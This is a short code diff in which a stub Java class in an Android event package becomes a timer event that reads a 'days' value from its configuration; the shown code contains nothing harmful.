@@ -1,11 +1,19 @@
 package com.android.service.event;
 
-public class EventQuota extends BaseEvent {
+import com.android.service.conf.ConfigurationException;
+
+public class EventAfterinst extends BaseTimer {
+
+	private int days;
 
 	@Override
-	public boolean parse(EventConf event) {
-		// TODO Auto-generated method stub
-		return false;
+	protected boolean parse(EventConf conf) {		
+		try {
+			days=conf.getInt("days");
+		} catch (ConfigurationException e) {
+			return false;
+		}
+		return true;
 	}
 
 	@Override
